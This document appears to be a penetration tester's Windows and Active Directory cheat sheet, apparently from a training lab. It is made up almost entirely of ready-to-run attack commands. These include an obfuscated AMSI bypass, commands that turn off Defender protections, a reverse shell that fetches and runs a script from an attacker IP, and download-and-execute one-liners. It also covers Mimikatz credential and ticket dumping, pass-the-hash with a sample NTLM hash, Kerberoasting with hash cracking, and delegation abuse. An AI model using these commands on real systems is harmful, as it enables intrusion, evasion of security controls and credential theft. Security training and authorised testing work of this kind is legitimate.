# Table of contents

- [Enumeration](#enumeration)
- [Transfer](#transfer)
- [Privilege escalation](#privilege-escalation)

## Enumeration

### General

Get system version
```powershell
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft
```

List / set execution policy
```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
```

Check what Windows protection are turn on
```powershell
Get-MpComputerStatus | findstr "True"
```

Users
```powershell
Get-WmiObject -Class Win32_useraccount
```

### Named Pipe

Get Named Pipes
```
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
get-childitem \\.\pipe\
(get-childitem \\.\pipe\).FullName
```
Process Explorer from sysinternals. Use the "Find -> Find Handle or DLL..." option and enter the pattern "\Device\NamedPipe\".


```
$pipe = Get-NtNamedPipeFile "\Device\NamedPipe\AviraOptimizerHost"
$pipe.SecurityDescriptor
Get-Acl "C:\Windows\xxx.dll" | fl
```

Check privs on named pipes
```
accesschk64.exe \\.\pipe\Log_servernamepipe
```


### Service commands

Check permission to service
```
sc sdshow [service]
```

Stop service
```
sc stop [service]
```

Start service
```
sc start [service]
```

Check if service start at boot up
```
sc qc [service]
```

## Transfer

### Client - get files

#### HTTP

certutil
```
certutil -urlcache -split -f "http://10.9.228.20/hijackme.dll" C:\temp\hijackme.dll
```
powershell
```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')
```

```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://10.11.0.90/fgdump.exe" >> wget.ps1
echo $file = "exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


#### FTP

```
echo open '[ip address]' 21> ftp.txt
echo user username password >> ftp.txt
echo put '[file to upload]'>> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

#### SMB

### Server - host files

HTTP server on port 80 
```powershell
Add-Type -AssemblyName "System.Web";$Hso=New-Object Net.HttpListener;$Hso.Prefixes.Add("http://+:80/");$Hso.Start();While ($Hso.IsListening){$HC=$Hso.GetContext();$HRes=$HC.Response;if($HC.Request.RawUrl -eq '/server/shutdown'){$Hso.Stop()};$HRes.Headers.Add("Content-Type",[System.Web.MimeMapping]::GetMimeMapping($HC.Request.RawUrl));$Stream=[System.IO.File]::OpenRead((Join-Path $Pwd ($HC.Request.RawUrl)));$HRes.ContentLength64=$Stream.Length;$Stream.CopyTo($HRes.OutputStream);$Stream.Close();$HRes.Close()};
```

# Privilege Escalation

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

# Active Directory

## Setup

Bypass Execution Policy
```powershell
powershell -ep bypass
```

Turn off AMSI 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

AMSI bypass
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Rev shell
```powershell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

Listener
```powershell
powercat -l -v -p 443 -t 100
```
Run remote command
```powershell
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Invoke-command -ScriptBlock {Invoke-Mimikatz} -Session $sess
Invoke-Command --ScriptBlock ${function:Invoke-Mimikatz} -ComputerName
Enter-PSSession $sess
```

Check language mode and app locker config
```powershell
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Copy files
```powershell
Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
Copy-Item C:\Users\pastudent149\Documents\PowerView.ps1 -Destination .\PowerView.ps1 -FromSession $sessTo149
```

Download
```powershell
iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
iex(iwr http://192.168.50.149/Invoke-Mimikatz.ps1)
iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
```
Run command
```cmd
runas /user:[Domain]\[user] cmd
```

Add content to file
```powershell
Add-Content IM.ps1 "Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::lsa /patch' "
```


## Enumeration

Current privs
```powershell
whoami /priv
```
WMI from powershell
```powershell
gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
Get Process name and its owner
```powershell
Get-Process -IncludeUserName
```

Get current domain
```powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain];$ADClass::GetCurrentDomain()
```


#### Bloodhound
```powershell
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```


#### PowerView

- [PowerView](https://github.com/lwierzbicki/PowerSploit/tree/master/Recon)
- [PowerSploit](https://powersploit.readthedocs.io)




### Attack

#### Over pass the hash

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```

#### Pass the ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\test\krb_tkt.kirbi"'
```


#### Kerberoast

Get Kerberos ticket for user with SPN
```powershell
Get-NetUser -SPN | select serviceprincipalname
Request-SPNTicket -SPN "<serviceprincipalname>"
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Crack kerberoast hashes
```powershell
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
```
Make user Kerberaostable
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
Set-DomainObject -Identity sqlreportuser -SET @{serviceprincipalname='sqlreportuser/funcrop.local'}
Set-DomainObject -Identify sqlreportuser -Clear serviceprincipalname
```
Check ACLs
```powershell
Invoke-ACLScanner | ?{$_.IdentityReferenceName -match 'jumpsrvadmin'}
```

### Unconstrained Delegation
Servers with uncontrained delegations
```powershell
Get-NetComputer -Unconstrained | select -ExpandProperty name
```
Dump tickets
```powershell
cd .\userX
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
Use PowerView to wait Domain Admin to access resource on specific host
```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
(dump tickets)
```
Reuse ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
```


#### Mimikatz


Get AES keys
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```
Get credentials vault
```powershell
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```
Get credentials from SAM
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Dump creds and certs
```powershell
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
```
Export kerberos tickets
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
